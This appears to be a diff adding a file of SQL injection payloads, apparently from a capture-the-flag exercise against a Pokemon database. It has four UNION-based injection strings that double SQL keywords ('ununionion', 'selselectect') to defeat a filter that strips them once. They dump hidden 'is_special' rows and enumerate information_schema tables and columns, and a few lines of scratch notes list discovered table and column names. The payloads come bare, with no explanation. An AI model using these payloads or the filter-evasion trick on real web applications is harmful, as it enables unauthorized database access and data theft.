@@ -1,0 +1,10 @@
+1' ununionion selselectect 1,2,	is_special,4,5,6,7,8,9,'10',name,description,'13','14','15',weaknesses,'17','0' frfromom pokemon whwhereere is_special=False--
+1' ununionion selselectect 1,2,'3',4,5,6,7,8,9,'10',name,description,'13','14','15',weaknesses,'17','0' frfromom pokemon whwhereere is_special=True--
+1' ununionion selselectect 1,2,'3',4,5,6,7,8,9,'10',table_name,'12','13','14','15','input3','17','0' frfromom information_schema.tables--
+1' ununionion selselectect 1,2,'3',4,5,6,7,8,9,'10',column_name,'12','13','14','15',table_name,'17','0' frfromom information_schema.columns-- 
+
+		
+foreign_servers
+s_img description 	
+m_img 	
+b_img weaknesses name
